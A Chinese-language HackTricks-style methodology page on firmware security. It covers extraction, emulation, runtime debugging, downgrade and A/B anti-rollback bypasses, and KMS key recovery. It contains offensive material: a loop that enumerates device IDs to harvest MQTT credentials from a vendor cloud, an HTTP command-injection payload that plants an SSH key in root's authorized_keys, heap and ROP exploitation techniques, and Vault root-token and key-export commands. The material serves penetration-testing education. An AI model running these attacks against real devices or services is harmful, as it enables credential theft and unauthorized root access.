# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是设备正常运行所必需的软件，负责管理并促进硬件组件与用户交互的软件之间的通信。固件存储在永久性存储器中，确保设备从通电时起就能访问重要指令，从而启动操作系统。检查固件并尝试对其进行修改，是识别安全漏洞的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **收集信息**

**收集信息**是了解设备构成及其所用技术的关键初始步骤。此过程涉及收集以下数据：

- CPU 架构及其运行的操作系统
- Bootloader 相关信息
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库和许可证类型
- 更新历史和监管认证
- 架构图和流程图
- 安全评估和已发现的漏洞

为此，**开源情报（OSINT）**工具非常有用；此外，还可以通过人工和自动化审查来分析任何可用的开源软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于发现潜在问题。

## **获取固件**

可以通过多种方式获取固件，各种方式的复杂程度各不相同：

- 从源头（开发者、制造商）**直接获取**
- 按照提供的说明**构建**
- 从官方支持网站**下载**
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问**云存储**，可使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 使用中间人技术拦截**更新**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中**提取**
- **嗅探**设备通信中的更新请求
- 识别并使用**硬编码的更新端点**
- 从 Bootloader 或网络**转储**
- 如果其他方法都失败，可使用合适的硬件工具**拆下并读取**存储芯片

### 仅有 UART 日志：通过闪存中的 U-Boot 环境变量强制启动 root shell

如果 UART RX 被忽略（仅有日志），仍然可以通过离线**编辑 U-Boot 环境变量数据块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹子和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 定位 U-Boot env 分区，编辑 `bootargs` 以包含 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应该会出现 shell。

这适用于 bootloader shell 已禁用，但可通过外部 flash 访问写入 env 分区的嵌入式设备。

## 分析固件

现在你已经**拿到了固件**，需要提取其中的信息，以了解该如何处理它。可以使用以下不同工具：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果使用这些工具没有发现太多内容，请用 `binwalk -E <bin>` 检查镜像的 **entropy**。如果熵较低，则它不太可能经过加密；如果熵较高，则它很可能经过加密（或以某种方式压缩）。

此外，你可以使用这些工具提取 **固件中嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）检查文件。

### 获取文件系统

使用前面提到的工具（例如 `binwalk -ev <bin>`），你应该已经能够 **提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，常见的类型包括：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的签名中**不包含文件系统的 magic byte**。在这种情况下，请使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩的文件系统**，然后按照下方步骤，根据文件系统类型**手动提取**。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

运行以下 **dd command**，对 Squashfs 文件系统进行 carving。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上面的示例中使用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND 闪存的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析固件

获取固件后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程需要使用各种工具来分析固件并从固件映像中提取有价值的数据。

### 初步分析工具

以下提供了一组用于初步检查二进制文件（称为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统的详细信息：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其**熵**。熵较低通常表示未加密，而熵较高则可能表示已加密或经过压缩。

要提取**嵌入文件**，建议使用 **file-data-carving-recovery-tools** 文档以及用于检查文件的 **binvis.io** 等工具和资源。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于一个以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，如果 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型，则需要手动提取：先用 `binwalk` 定位文件系统的偏移量，再使用 `dd` 命令 carve 出文件系统：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取其中的内容。

### 文件系统分析

提取文件系统后，便开始查找安全缺陷。重点关注不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 供进一步分析的嵌入式二进制文件
- 常见 IoT 设备的 Web 服务器和二进制文件

以下工具有助于在文件系统中发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)，用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)，用于全面分析固件
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)，用于静态和动态分析

### 编译二进制文件的安全检查

必须仔细检查在文件系统中发现的源代码和编译二进制文件是否存在漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 则可用于 Windows 二进制文件，帮助识别可能被利用的未受保护二进制文件。

## 通过派生的 URL 令牌获取云配置和 MQTT 凭据

许多 IoT 集线器会从类似以下的云端端点获取各设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析期间，你可能会发现 `<token>` 是通过设备 ID 和硬编码密钥在本地派生出来的，例如：

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

这种设计意味着，任何知道 deviceId 和 STATIC_KEY 的人都能重建 URL 并获取云端配置，其中通常会泄露明文 MQTT 凭据和主题前缀。

实用流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找输出云配置 URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从 firmware 中恢复 STATIC_KEY 和 token 算法

- 将二进制文件加载到 Ghidra/radare2，并搜索 config 路径（"/pf/"）或 MD5 用法。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中派生 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集云配置和 MQTT 凭据

- 组合 URL 并用 curl 拉取 JSON；用 jq 提取密钥：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护主题，并查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（大规模进行，需获授权）

- 许多生态系统会在顺序后缀前嵌入厂商 OUI/产品/类型字节。
- 你可以遍历候选 ID，以编程方式派生 token 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

说明
- 尝试大规模枚举前，务必取得明确授权。
- 条件允许时，优先使用仿真或静态分析来获取机密信息，避免修改目标硬件。


仿真固件的过程可以对设备运行情况或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将根文件系统或特定二进制文件传输到架构和字节序相匹配的设备（例如 Raspberry Pi）或预先构建的虚拟机中，有助于开展进一步测试。

### 仿真单个二进制文件

检查单个程序时，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

并安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（big-endian），使用 `qemu-mips`；对于 little-endian 二进制文件，则应使用 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，过程类似，使用 `qemu-arm` emulator 进行仿真。

### 完整系统仿真

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可实现完整的固件仿真、自动化处理流程，并辅助动态分析。

### 重建用于仿真的拆分及经过验证的根文件系统

如果 SquashFS superblock 可读，但 inode、目录或 fragment table 的偏移不合理，请勿立即修补 `unsquashfs`。应逆向分析早期启动二进制文件，并复现其创建的块设备图：嵌入式系统可能会显示一个名义上的根分区，但实际文件系统是通过 `dm-linear` 映射构建的，该映射会追加从另一个分区借用的扇区。即使后续所有元数据块的位置都发生偏移，仅检查 superblock 也可能成功。<sup>[[9]](#references)</sup>

必须原样保留固件中的运算。尤其要确认长度的单位是字节、512 字节扇区还是 4 KiB 页；按原始顺序复现移位和截断操作；并考虑 A/B 布局中依赖 bank 的尾部区域。例如，`(partition_bytes >> 12) << 3` 会先截断到 4 KiB 边界，再将结果换算为 512 字节扇区；若将其替换为 `partition_bytes // 512`，追加区域可能偏移几 KB，进而破坏所有后续 SquashFS 表。<sup>[[9]](#references)</sup>

一种实用的验证流程如下：<sup>[[9]](#references)</sup>

1. 从 verifier/init 二进制文件中还原每个 `dm-linear` 段的源设备、起始扇区和长度。
2. 拼接或映射这些区域，同时保持其对齐语义不变。
3. 如果仍无法提取，只在预测边界附近搜索一个较小的窗口，并要求连续出现多个有效元数据结构，而不是仅凭一个看似合理的 superblock 就下结论。
4. 对重建的镜像运行未经修改的 `unsquashfs`；能够成功遍历所有目录和 fragment，比 `unsquashfs -stat` 更有说服力。

#### 由分析人员控制的 dm-verity 替换

如果分析人员控制 QEMU kernel、initramfs 和虚拟磁盘，可以用一个小型静态链接 init 替换厂商的验证 PID 1，从而启动修改后的根文件系统。这属于**实验室中的启动链替换**，并不意味着破解了 dm-verity、其 RSA signature、Secure Boot 或 TPM 密封密钥。<sup>[[9]](#references)</sup>

替换用的 init 应复现原始启动路径中的关键操作：挂载 `devtmpfs`、调用 `setsid()`、将 `/dev/console` 连接到文件描述符 0–2、挂载 `/proc` 和 `/sys`、等待提供的块设备就绪、以只读方式挂载修改后的根文件系统、分离旧根文件系统的伪文件系统、将新挂载点移动到 `/`、执行 `chroot`，然后 `execve()` 固件原有的 `/sbin/init`。在 `MS_MOVE` **之前**分离 `/dev`、`/proc` 和 `/sys`，可避免意外分离属于新根文件系统的挂载点。<sup>[[9]](#references)</sup>

将可变设备状态与修改后的不可变根文件系统分开。qcow2 overlay 可以保留原始磁盘的 LVM 状态，同时由第二块只读 virtio 磁盘提供修改后的 SquashFS：<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 离线镜像状态调试

当启动缓慢、破坏性启动脚本或不可靠的控制台日志掩盖故障时，请检查虚拟机外部的持久化状态。切勿挂载正在被运行中的 VM 使用的 overlay；使用 `qemu-nbd` 将其暴露出来，将 LVM 发现范围限制为预期的 NBD 分区，并在断开连接前停用卷组。<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

为便于重复进行故障隔离，将带时间戳的标记文件写入稳定的可写卷，并离线验证；`/dev/kmsg`、FIFO 和临时控制台可能因速率限制或进程过早退出而导致假阴性。更改无关代码前，也要比较各层的确切接口：`uname -r` 与 `/lib/modules/`、磁盘上的 ext4 特性与内核配置，以及 Mesa `libGL` 的版本与 DRI 驱动 ABI 和根据 PCI 信息确定的驱动名称。某个组件可能确实存在，甚至能成功 `dlopen()`，但由于其使用方期望不同的 ABI，仍无法使用。<sup>[[9]](#references)</sup>

## 实战动态分析

在此阶段，使用真实设备环境或仿真设备环境进行分析。必须确保能够通过 shell 访问操作系统和文件系统。仿真可能无法完美模拟硬件交互，因此有时需要重启仿真。分析应重新检查文件系统，exploit 暴露的网页和网络服务，并探查 bootloader 漏洞。固件完整性测试对于识别潜在的后门漏洞至关重要。

## 运行时分析技术

运行时分析是在进程或二进制文件的运行环境中与其交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 等技术识别漏洞。

对于没有完整调试器的嵌入式目标，**将静态链接的 `gdbserver` 复制**到设备上，然后远程连接：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 消息映射

在 IoT hub 上，RF stack 通常由 **radio MCU** 和 Linux 用户态进程分担。一个实用的工作流程是梳理以下路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text 或 TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个逆向分析目标，而非一个。如果 controller 将二进制 radio frame 转换为 `Group,Command,arg1,arg2,...` 之类的文本协议，就要还原：

- **message groups** 和 dispatch tables
- 哪些消息来自 **network**，哪些来自 controller 本身
- 确切的 **manufacturer-specific discriminator fields**（例如 Zigbee `manufacturer_code` 和自定义的 `cluster_command`）
- 哪些 handler 只能在 **commissioning**、发现或固件/型号下载阶段访问

针对 Zigbee，捕获配对流量，并检查目标是否仍依赖默认 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning 流量可能会暴露 **Network Key**。Zigbee 3.0 install codes 可以降低这种风险，因此要记录受测设备是否实际强制使用这些代码。

### Manufacturer-specific protocol handlers 和 FSM 控制的可达性

与标准化 cluster 相比，厂商专用的 Zigbee/ZCL 命令通常是更好的目标，因为它们会进入 **custom parsing code** 和内部 **FSM**，而这些代码通常缺乏经过充分实战检验的验证逻辑。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向分析 command dispatcher，直到找到 **vendor-only handler**。
- 还原 **FSM state**、**event**、**check**、**action** 和 **next-state** tables。
- 找出会自动推进的 **transitional states**，以及最终会重置或释放攻击者可控状态的 retry/error 分支。
- 确认需要哪些合法的 protocol exchanges 才能让 daemon 进入易受攻击的状态，不要假设有缺陷的 handler 总是可达。

对于对时序敏感的协议，通过 Python framework 重放数据包可能太慢。更可靠的做法是在真实硬件（例如 **nRF52840**）上模拟合法设备，并使用厂商级 stack，以便暴露正确的 **endpoints**、**attributes** 和 commissioning 时序。

### 嵌入式 daemon 中的分片下载漏洞类型

在 **fragmented blob/model/configuration downloads** 中，一类常见的固件漏洞如下：<sup>[[8]](#references)</sup>

1. **第一个分片**（`offset == 0`）保存 `ctx->total_size` 并分配 `malloc(total_size)`。
2. 后续分片只验证攻击者可控的**数据包局部**字段，例如 `packet_total_size >= offset + chunk_len`。
3. 复制操作使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却不检查是否超出**最初分配的大小**。

攻击者可以：

- 发送第一个有效分片，声明一个**较小**的总大小，以强制进行较小的 heap 分配。
- 之后发送一个具有**预期 offset**、但 `chunk_len` 更大的分片。
- 伪造数据包局部大小，使其通过新的检查，同时仍溢出最初分配的 buffer。

当易受攻击的路径受 commissioning 逻辑控制时，利用过程必须包含足够的**设备模拟**，先驱动目标进入预期的 model-download 或 blob-download 状态，再发送格式错误的分片。

### 由协议触发的 `free()`

在嵌入式 daemon 中，触发 heap metadata 利用最简单的方式往往不是“等待清理”，而是**触发协议自身的错误处理逻辑**：<sup>[[8]](#references)</sup>

- 发送格式错误的后续分片，让 FSM 进入 **retry** 或 **error** 状态。
- 超过 retry 阈值，使 daemon **重置 context** 并释放被破坏的 buffer。
- 利用这个可预测的 `free()` 触发 allocator 侧的原语，避免进程因其他原因先崩溃。

这对嵌入式 Linux 上的 **musl/uClibc/dlmalloc-like** allocator 尤其有用：破坏 chunk metadata 可以将 unlink/unbin 逻辑转化为写入原语。一种稳定的方法是破坏 **size field**，将 allocator 遍历引导至溢出 buffer 内预先布置的 **fake chunks**，而不是立即覆盖真实的 bin pointers 并导致进程崩溃。

## 二进制利用和概念验证

为已识别的漏洞开发 PoC，需要深入了解目标架构并使用较低级别的语言编程。嵌入式系统中很少启用二进制运行时保护，但如果存在，可能就需要使用 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin 利用注意事项（嵌入式 Linux）

- **Fastbins + consolidation：** uClibc 使用类似 glibc 的 fastbins。之后较大的分配可能会触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过检查（合理的 size、`fd = 0`，以及被视为“in use”的周边 chunks）。<sup>[[6]](#references)</sup>
- **ASLR 下的 non-PIE binaries：** 如果启用了 ASLR，但主 binary 是 **non-PIE**，则 binary 内的 `.data/.bss` 地址稳定。可以将 fastbin allocation 指向已具有类似有效 heap chunk header 的区域，从而落在 **function pointer table** 上。
- **使 parser 停止的 NUL：** 解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留后续由攻击者控制的字节，供 stack pivot/ROP chain 使用。
- **通过 `/proc/self/mem` 执行 shellcode：** 调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain 可以将可执行 shellcode 写入已知 mapping，然后跳转到该处。

## 用于固件分析的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供预配置环境，用于固件安全测试，并配备必要的工具。

## 用于分析固件的预配置操作系统

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个专为 Internet of Things (IoT) 设备安全评估和渗透测试设计的发行版。它提供预配置环境并加载所有必要工具，可以为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的嵌入式安全测试操作系统，预装了固件安全测试工具。

## 固件降级攻击和不安全的更新机制

即使厂商对固件映像实施了加密签名检查，**版本回滚（降级）保护也经常被忽略**。如果 boot 或 recovery loader 只使用内置公钥验证签名，却不比较待刷入映像的*版本*（或单调计数器），攻击者就可以合法安装**仍带有有效签名的旧版易受攻击固件**，从而重新引入已修补的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取旧版签名映像**
   * 从厂商的公开下载门户、CDN 或支持网站获取。
   * 从配套的移动端/桌面端应用中提取（例如 Android APK 的 `assets/firmware/` 目录）。
   * 从 VirusTotal、Internet archives、论坛等第三方存储库获取。
2. 通过任何已暴露的更新渠道将映像**上传到设备或提供给设备**：
   * Web UI、mobile-app API、USB、TFTP、MQTT 等。
   * 许多消费级 IoT 设备会暴露*未经身份验证*的 HTTP(S) endpoint，接受 Base64 编码的固件 blob，在服务器端解码并触发 recovery/upgrade。
3. 降级后，利用新版本中已修补的漏洞（例如后来添加的 command-injection filter）。
4. 获得持久化后，可选择刷回最新映像或禁用更新以避免被发现。

### 示例：降级后的命令注入

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞的（降级后的）固件中，`md5` 参数会未经清理直接拼接到 shell 命令中，从而允许注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本加入了基本的字符过滤，但由于缺少防降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会在配套移动应用中捆绑完整的固件映像，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密形式存储在 APK/APEX 中的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra` 等工具，甚至普通的 `unzip`，即可提取经过签名的映像，无需接触实体硬件。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 设计中的仅限 updater 的 anti-rollback 绕过

有些厂商确实实现了 anti-downgrade **ratchet**，但它只存在于 *updater* 逻辑中（例如通过 CAN 执行的 UDS routine、recovery command 或 userspace OTA agent）。如果 **bootloader** 后续只检查镜像签名/CRC，并信任分区表或 slot metadata，仍然可以绕过 rollback protection。<sup>[[7]](#references)</sup>

典型的弱设计：

- Firmware metadata 同时包含版本描述符和 **security ratchet** / 单调计数器。
- Updater 会将镜像 ratchet 与持久化存储中的值进行比较，并拒绝较旧的已签名镜像。
- Bootloader **不解析**该 ratchet，只在启动所选 slot 前验证 header、CRC 和签名。
- Slot activation 单独存储在分区表或每个 slot 的 generation counter 中，且**未通过密码学方式绑定**到已验证的确切 firmware digest。

这会在双 slot 系统中产生一种**验证一个镜像、启动另一个镜像**的原语。如果攻击者能让 updater 使用当前签名镜像将 slot B 标记为下一个启动目标，并在重启前覆盖 slot B，bootloader 仍可能启动降级镜像，因为它只信任已提交的 slot metadata。

常见滥用模式：

1. 将**当前签名**固件上传到被动 slot，并运行正常的验证/切换 routine，使布局将该 slot 标记为下一个活动 slot。
2. **暂不重启**。在同一会话中重新进入 slot 准备/擦除 routine。
3. 滥用过期的 boot-state 或 slot-selection 逻辑，使 updater 擦除刚刚被提升的**同一个物理 slot**。
4. 将**较旧但仍有签名**的固件写入该 slot。
5. 跳过执行 ratchet 检查的验证 routine，直接重启。
6. Bootloader 选择被提升的 slot，只验证签名/完整性，然后启动旧镜像。

逆向分析 A/B update 实现时的检查要点：

- Slot selection 是否由**启动时 flags**决定，且成功切换后未刷新。
- 类似 `prepare_passive_slot()` 的 routine 是否依据过期状态擦除 slot，而非依据**当前已提交的布局**。
- 类似 `part_write_layout()` 的函数是否只递增**generation counter** / active flag，而不存储已验证镜像的 hash。
- Ratchet 检查是否仅在 userspace 或 updater 代码中实现，**而不在** ROM / bootloader / secure boot 阶段中实现。
- 擦除或 recovery routine 是否会在 slot 内容被删除并重写后，仍将该 slot 保持为可启动状态。

### 评估 Update Logic 的检查清单

* *Update endpoint* 的传输/身份验证是否得到了充分保护（TLS + 身份验证）？
* 设备在刷写前是否会比较**版本号**或**单调 anti-rollback 计数器**？
* 镜像是否在 secure boot chain 中得到验证（例如由 ROM code 检查签名）？
* **Bootloader 是否执行与 updater 相同的 ratchet**，而不只是检查签名/CRC？
* Slot activation metadata 是否**绑定到已验证的 firmware digest/version**，还是 slot 在提升后仍可被修改？
* Slot 切换成功后，设备是否会被强制重启，还是同一会话中仍可调用后续 update/erase routine？
* Userland 代码是否会执行额外的合理性检查（例如允许的分区映射、型号）？
* *部分*或*备份* update 流程是否复用了相同的验证逻辑？

> 💡  如果上述任一项缺失，该平台可能容易受到 rollback attack。

## 用于练习的 Vulnerable firmware

要练习在 firmware 中发现漏洞，可以从以下 vulnerable firmware 项目入手。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复 firmware 解密密钥

当 update image 将少量明文 metadata 与大型高熵数据块混合在一起时，应先进行容器初步分析，再尝试暴力破解：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 转储 headers、偏移量和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是 ciphertext。
- 解码后恰好为 `256` 字节的 Base64 字段，强烈暗示这是用于包装随机 firmware password/session key 的 RSA-2048 ciphertext。
- 同一文件中的 detached PGP material 通常只保护真实性；不要假定它用于保密。

如果静态密钥搜索（`grep`、`strings`、PEM/PGP 搜索）无果，应逆向**实际解密路径**，而不只是搜索私钥：

- 反编译 updater / management binary，追踪读取加密数据块的组件、用于解包的 helper/API，以及它请求的逻辑密钥名称。
- 在提取出的 root filesystem 中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit files 和 init scripts。
- 将明文 `vault operator unseal ...`、recovery keys、bootstrap tokens 或本地 KMS 自动 unseal scripts 视为等同于私钥材料。

如果设备附带原始 Vault binary 和 storage backend，重放该环境通常比重新实现 Vault 内部机制更容易：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上取得 root 权限后：

- 仅在隔离的克隆环境中将 transit keys 设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
